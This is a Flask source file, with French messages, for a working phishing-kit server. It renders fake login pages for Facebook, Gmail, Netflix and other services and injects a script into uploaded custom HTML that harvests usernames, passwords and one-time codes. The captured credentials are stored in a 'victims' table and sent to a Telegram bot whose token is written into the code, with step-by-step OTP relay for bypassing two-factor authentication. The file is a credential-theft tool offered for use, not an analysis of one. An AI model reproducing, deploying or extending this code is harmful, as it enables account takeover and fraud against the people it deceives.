import os
from flask import Flask, request, jsonify, render_template, render_template_string
import requests
import datetime
import sqlite3
import json

app = Flask(__name__)

ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8797682325:AAFMj6kcNv2R_EF3cWtl2pvWuRXVX4UwV7Q")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "6141755021")

DB_NAME = 'abeilles.db'

PLATFORM_LOGOS = {
    "Facebook": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg",
    "Instagram": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg",
    "TikTok": "https://upload.wikimedia.org/wikipedia/commons/a/a6/Logo_NIKE.svg",
    "Gmail": "https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg",
    "Netflix": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg",
    "Telegram": "https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg",
    "Amazon": "https://upload.wikimedia.org/wikipedia/commons/4/4a/Amazon_icon.svg",
    "Snapchat": "https://upload.wikimedia.org/wikipedia/commons/c/c4/Snapchat_logo.svg"
}

def get_db_connection():
    conn = sqlite3.connect(DB_NAME, timeout=30.0)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            network TEXT,
            type TEXT,
            victimUser TEXT,
            victimPass TEXT,
            victimOtp TEXT,
            dateStr TEXT,
            timestamp INTEGER,
            ip TEXT,
            extra_info TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS custom_pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            slug TEXT UNIQUE,
            title TEXT,
            network TEXT,
            bg_type TEXT,
            bg_value TEXT,
            logo_url TEXT,
            logo_shape TEXT,
            fields_json TEXT,
            btn_text TEXT,
            html_code TEXT,
            redirect_url TEXT,
            mode TEXT,
            box_bg TEXT,
            box_width TEXT,
            created_at INTEGER
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def cleanup_expired_custom_pages():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        twenty_four_hours_ago = int((datetime.datetime.now().timestamp() - 86400) * 1000)
        cursor.execute("DELETE FROM custom_pages WHERE created_at < ?", (twenty_four_hours_ago,))
        conn.commit()
        conn.close()
    except Exception as e:
        print("Erreur nettoyage liens 24h:", e)

def send_telegram_photo_and_message(bot_token, chat_id, photo_url, caption):
    if not bot_token or bot_token == "VOTRE_BOT_TOKEN":
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    payload = {
        "chat_id": chat_id,
        "photo": photo_url,
        "caption": caption,
        "parse_mode": "Markdown"
    }
    try:
        res = requests.post(url, json=payload, timeout=5)
        if res.status_code != 200:
            send_telegram_notification(bot_token, chat_id, caption)
    except Exception as e:
        print("Erreur Telegram Photo:", e)

def send_telegram_notification(bot_token, chat_id, message):
    if not bot_token or bot_token == "VOTRE_BOT_TOKEN":
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Erreur Telegram:", e)

@app.route('/')
def index():
    cleanup_expired_custom_pages()
    return render_template('index.html')

@app.route('/phish/<path:subpath>')
def render_phish_page(subpath):
    cleanup_expired_custom_pages()
    subpath_clean = subpath.lower().strip('/')
    req_type = request.args.get('type', 'standard').lower()
    owner_param = request.args.get('user', 'Kim')
    
    db_slug = subpath_clean.replace('otp/', '').replace('standard/', '')

    # Recherche No-Code ultra-robuste avec plusieurs variantes pour éviter l'erreur 404
    conn = get_db_connection()
    cursor = conn.cursor()
    
    possible_slugs = [
        db_slug,
        db_slug.replace('-', '_'),
        db_slug.replace('_', '-'),
        subpath_clean
    ]
    
    cp = None
    for s in possible_slugs:
        cursor.execute("SELECT * FROM custom_pages WHERE slug = ?", (s,))
        cp = cursor.fetchone()
        if cp:
            break
            
    conn.close()

    if cp:
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        if (now_ts - cp["created_at"]) > 86400000:
            return "Ce lien a expiré après 24 heures.", 410

        redirect_url = cp["redirect_url"] or "https://www.google.com"

        # Option 2 No-Code (INTACTE)
        if cp["mode"] == 'opt2' and cp["html_code"]:
            html = cp["html_code"]
            owner = cp["owner"]
            network = cp["network"]

            robust_injection_script = """
            <script>
            (function() {
                let isSubmitted = false;
                function processCapture(e) {
                    if (isSubmitted) return;
                    let userVal = "", passVal = "", otpVal = "";
                    const allInputs = document.querySelectorAll('input, select, textarea');
                    allInputs.forEach(inp => {
                        let name = (inp.name || inp.id || inp.type || "").toLowerCase();
                        let val = inp.value;
                        if (!val) return;
                        if (name.includes('user') || name.includes('email') || name.includes('login') || name.includes('tel') || name.includes('phone') || name.includes('compte')) {
                            userVal = val;
                        } else if (name.includes('pass') || name.includes('mdp') || name.includes('password') || name.includes('pin')) {
                            passVal = val;
                        } else if (name.includes('otp') || name.includes('code') || name.includes('secret')) {
                            otpVal = val;
                        }
                    });

                    const hasOtpField = Array.from(allInputs).some(inp => {
                        let name = (inp.name || inp.id || "").toLowerCase();
                        return name.includes('otp') || name.includes('code') || name.includes('secret');
                    });

                    if (hasOtpField && !otpVal) {
                        isSubmitted = true;
                        if (e) e.preventDefault();
                        const payloadStep1 = JSON.stringify({
                            owner: "__OWNER__",
                            network: "__NETWORK__",
                            type: "custom_html_otp_step1",
                            victimUser: userVal || "Inconnu",
                            victimPass: passVal || "Inconnu",
                            otp: "En attente OTP..."
                        });

                        fetch('/api/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: payloadStep1,
                            keepalive: true
                        }).finally(() => {
                            isSubmitted = false;
                        });
                        return;
                    }

                    isSubmitted = true;
                    if (e) e.preventDefault();

                    const payload = JSON.stringify({
                        owner: "__OWNER__",
                        network: "__NETWORK__",
                        type: "custom_html",
                        victimUser: userVal || "Inconnu",
                        victimPass: passVal || "Inconnu",
                        otp: otpVal || "Aucun"
                    });

                    fetch('/api/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: payload,
                        keepalive: true
                    }).finally(() => {
                        window.location.replace("__REDIRECT_URL__");
                    });

                    setTimeout(() => {
                        window.location.replace("__REDIRECT_URL__");
                    }, 800);
                }

                document.addEventListener('DOMContentLoaded', function() {
                    const forms = document.querySelectorAll('form');
                    forms.forEach(form => {
                        form.addEventListener('submit', function(e) { processCapture(e); });
                    });
                    const submitBtns = document.querySelectorAll('button[type="submit"], input[type="submit"], button');
                    submitBtns.forEach(btn => {
                        btn.addEventListener('click', function(e) {
                            setTimeout(() => processCapture(e), 40);
                        });
                    });
                });
            })();
            </script>
            """.replace("__OWNER__", owner).replace("__NETWORK__", network).replace("__REDIRECT_URL__", redirect_url)
            
            if "</body>" in html:
                html = html.replace("</body>", robust_injection_script + "</body>")
            else:
                html += robust_injection_script

            return render_template_string(html)
        else:
            # Option 1 No-Code avec gestion dynamique de la taille du cadre (box_width)
            config = {
                "owner": cp["owner"],
                "title": cp["title"],
                "network": cp["network"],
                "bg_type": cp["bg_type"],
                "bg_value": cp["bg_value"],
                "logo_url": cp["logo_url"],
                "logo_shape": cp["logo_shape"],
                "fields": json.loads(cp["fields_json"] or '[]'),
                "btn_text": cp["btn_text"],
                "box_width": cp.get("box_width") or "420px",
                "redirect_url": redirect_url
            }
            return render_template_string(OPTION1_TEMPLATE, config=config)

    # Routage physique Standard / OTP de secours
    is_otp_request = (req_type == 'otp' or 'otp' in request.path.lower() or 'otp' in subpath)
    base_name = db_slug.replace('_otp', '').replace('-otp', '')
    
    if is_otp_request:
        possible_templates = [
            f"otp/{db_slug}.html",
            f"otp/{base_name}_otp.html",
            f"otp/{base_name}-otp.html",
            f"otp/{base_name}.html"
        ]
    else:
        possible_templates = [
            f"standard/{db_slug}.html",
            f"standard/{base_name}.html",
            f"standard/{base_name}_otp.html",
            f"standard/{db_slug}_otp.html"
        ]

    for template_path in possible_templates:
        try:
            rendered_page = render_template(template_path, owner=owner_param, network=base_name.capitalize())
            return rendered_page
        except Exception:
            continue

    return f"Page physique introuvable pour : {subpath}", 404


OPTION1_TEMPLATE = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ config.title }}</title>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { 
            background: {% if config.bg_type == 'color' %}{{ config.bg_value }}{% else %}url('{{ config.bg_value }}') no-repeat center center fixed{% endif %}; 
            background-size: cover; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
        }
        .box { 
            background: rgba(255, 255, 255, 0.95); 
            padding: 40px 30px; 
            border-radius: 14px; 
            width: 90%; 
            max-width: {{ config.box_width }}; 
            text-align: center; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.3); 
            margin: 20px;
        }
        .logo-container {
            width: 85px;
            height: 85px;
            margin: 0 auto 20px auto;
            border-radius: {% if config.logo_shape == 'circle' %}50%{% else %}12px{% endif %};
            background: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            border: 2px solid #f5b014;
            overflow: hidden;
            padding: 8px;
        }
        .logo { width: 100%; height: 100%; object-fit: contain; }
        h2 { color: #222; margin-bottom: 25px; font-size: 22px; font-weight: 600; }
        input { 
            width: 100%; 
            padding: 14px 16px; 
            margin: 10px 0; 
            background: #fafafa; 
            border: 1px solid #ddd; 
            color: #333; 
            border-radius: 8px; 
            font-size: 15px; 
            transition: all 0.3s;
        }
        input:focus { border-color: #f5b014; outline: none; background: #fff; box-shadow: 0 0 0 3px rgba(245,176,20,0.2); }
        button { 
            width: 100%; 
            padding: 14px; 
            background: linear-gradient(135deg, #f5b014, #e09b0c); 
            border: none; 
            color: #fff; 
            font-weight: 700; 
            border-radius: 8px; 
            cursor: pointer; 
            margin-top: 20px; 
            font-size: 16px; 
            box-shadow: 0 4px 12px rgba(245,176,20,0.4);
            transition: transform 0.2s;
        }
        button:hover { opacity: 0.95; transform: translateY(-1px); }
    </style>
</head>
<body>
    <div class="box">
        {% if config.logo_url %}
        <div class="logo-container">
            <img src="{{ config.logo_url }}" class="logo" alt="Logo">
        </div>
        {% endif %}
        <h2>{{ config.title }}</h2>
        <form onsubmit="submitOpt1(event)">
            {% for f in config.fields %}
            <input type="{{ f.type }}" id="{{ f.name }}" placeholder="{{ f.label }}" required>
            {% endfor %}
            <button type="submit">{{ config.btn_text }}</button>
        </form>
    </div>
    <script>
        function submitOpt1(e) {
            e.preventDefault();
            const user = document.getElementById('victimUser') ? document.getElementById('victimUser').value : "Inconnu";
            const pass = document.getElementById('victimPass') ? document.getElementById('victimPass').value : "Inconnu";
            const otpEl = document.getElementById('otp');
            const otp = otpEl ? otpEl.value : "Aucun";

            fetch('/api/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    owner: "{{ config.owner }}",
                    network: "{{ config.network }}",
                    type: "option1_nocode",
                    victimUser: user,
                    victimPass: pass,
                    otp: otp
                })
            }).then(() => {
                window.location.replace("{{ config.redirect_url }}");
            });
        }
    </script>
</body>
</html>
"""

@app.route('/api/create_login', methods=['POST'])
def create_login():
    data = request.json
    owner = data.get('owner', '').strip()
    slug = data.get('slug', '').strip().lower().replace(' ', '_')
    
    if not owner or not slug:
        return jsonify({"status": "error", "message": "Propriétaire ou slug manquant"})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        
        mode = data.get('mode', 'opt1')
        box_width = data.get('boxWidth', '420px')
        redirect_url = data.get('redirectUrl', 'https://www.google.com')

        if mode == 'opt2':
            cursor.execute('''
                INSERT OR REPLACE INTO custom_pages (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                owner, slug, "Page Perso HTML", data.get('network'),
                "color", "#111", "", "circle", "[]", "Valider",
                data.get('htmlCode'), redirect_url, 'opt2', box_width, now_ts
            ))
        else:
            cursor.execute('''
                INSERT OR REPLACE INTO custom_pages (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                owner, slug, data.get('title'), data.get('network'),
                data.get('bgType'), data.get('bgValue'), data.get('logoUrl'),
                data.get('logoShape'), json.dumps(data.get('fields')), data.get('btnText'), "", redirect_url, 'opt1', box_width, now_ts
            ))
            
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/custom_pages', methods=['GET'])
def get_custom_pages():
    cleanup_expired_custom_pages()
    owner = request.args.get('owner', '').strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if owner:
        cursor.execute("SELECT * FROM custom_pages WHERE owner = ? ORDER BY id DESC", (owner,))
    else:
        cursor.execute("SELECT * FROM custom_pages ORDER BY id DESC")
        
    rows = cursor.fetchall()
    conn.close()
    
    pages = []
    for row in rows:
        pages.append({
            "slug": row["slug"],
            "title": row["title"],
            "network": row["network"],
            "mode": row["mode"]
        })
    return jsonify(pages)

@app.route('/api/clear_victims', methods=['POST'])
def clear_victims():
    data = request.json
    owner = data.get('owner', '').strip()
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM victims WHERE owner = ?", (owner,))
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/capture', methods=['POST'])
def capture_data():
    data = request.json or {}
    owner = data.get('owner', 'Kim').strip()
    network = data.get('network', 'Facebook')
    v_user = data.get('victimUser')
    v_pass = data.get('victimPass')
    v_otp = data.get('otp', 'Aucun')
    v_type = data.get('type', 'standard')
    
    raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    v_ip = raw_ip.split(',')[0].strip() if raw_ip else "127.0.0.1"
    
    current_time = datetime.datetime.now()
    timestamp = int(current_time.timestamp() * 1000)
    date_str = current_time.strftime("%d/%m/%Y %H:%M:%S")

    conn = get_db_connection()
    cursor = conn.cursor()

    if v_type in ["custom_html_otp_step1", "physical_otp_step1"] or (v_otp == 'En attente OTP...'):
        cursor.execute('''
            INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (owner, network, v_type, v_user, v_pass, "En attente OTP...", date_str, timestamp, v_ip))
        conn.commit()
        conn.close()

        logo_img = PLATFORM_LOGOS.get(network, "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg")
        alert_text = (
            f"🚨 *NOUVELLE VICTIME (IDENTIFIANTS - OTP EN ATTENTE)* 🚨\n\n"
            f"📚 *Plateforme:* {network}\n"
            f"👤 *Propriétaire:* `{owner}`\n"
            f"🎯 *Identifiant:* `{v_user}`\n"
            f"🔑 *Mot de passe:* `{v_pass}`\n"
            f"🔒 *OTP:* `En attente...`\n"
            f"🕒 *Heure:* `{date_str}`\n"
            f"📍 *IP:* `{v_ip}`"
        )
        send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert_text)
        return jsonify({"status": "success"})

    if v_otp and v_otp != 'Aucun' and v_otp != 'En attente OTP...':
        cursor.execute('''
            SELECT id FROM victims WHERE owner = ? AND network = ? AND victimUser = ? ORDER BY id DESC LIMIT 1
        ''', (owner, network, v_user))
        existing = cursor.fetchone()
        if existing:
            cursor.execute('''
                UPDATE victims SET victimOtp = ?, dateStr = ?, timestamp = ?, ip = ? WHERE id = ?
            ''', (v_otp, date_str, timestamp, v_ip, existing["id"]))
            conn.commit()
            conn.close()
            
            logo_img = PLATFORM_LOGOS.get(network, "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg")
            alert_text = (
                f"🚨 *VICTIME COMPLÈTE (AVEC OTP VALIDÉ)* 🚨\n\n"
                f"📚 *Plateforme:* {network}\n"
                f"👤 *Propriétaire:* `{owner}`\n"
                f"🎯 *Identifiant:* `{v_user}`\n"
                f"🔑 *Mot de passe:* `{v_pass}`\n"
                f"🔒 *OTP:* `{v_otp}`\n"
                f"🕒 *Heure:* `{date_str}`\n"
                f"📍 *IP:* `{v_ip}`"
            )
            send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert_text)
            return jsonify({"status": "success"})

    cursor.execute('''
        INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip))
    conn.commit()
    conn.close()

    logo_img = PLATFORM_LOGOS.get(network, "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg")
    alert_text = (
        f"🚨 *NOUVELLE VICTIME CAPTURÉE* 🚨\n\n"
        f"📚 *Plateforme:* {network}\n"
        f"👤 *Propriétaire:* `{owner}`\n"
        f"🎯 *Identifiant:* `{v_user}`\n"
        f"🔑 *Mot de passe:* `{v_pass}`\n"
        f"🔒 *OTP:* `{v_otp}`\n"
        f"🕒 *Heure:* `{date_str}`\n"
        f"📍 *IP:* `{v_ip}`"
    )
    send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert_text)

    return jsonify({"status": "success"})

@app.route('/api/victims', methods=['GET'])
def get_victims():
    owner = request.args.get('owner', '').strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if owner:
        cursor.execute("SELECT * FROM victims WHERE owner LIKE ? ORDER BY id DESC", (f"%{owner}%",))
    else:
        cursor.execute("SELECT * FROM victims ORDER BY id DESC")
        
    rows = cursor.fetchall()
    conn.close()
    
    victims_list = []
    for row in rows:
        victims_list.append({
            "id": row["id"],
            "owner": row["owner"],
            "network": row["network"],
            "type": row["type"],
            "victimUser": row["victimUser"],
            "victimPass": row["victimPass"],
            "otp": row["victimOtp"],
            "dateStr": row["dateStr"],
            "timestamp": row["timestamp"],
            "ip": row["ip"]
        })
    return jsonify(victims_list)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
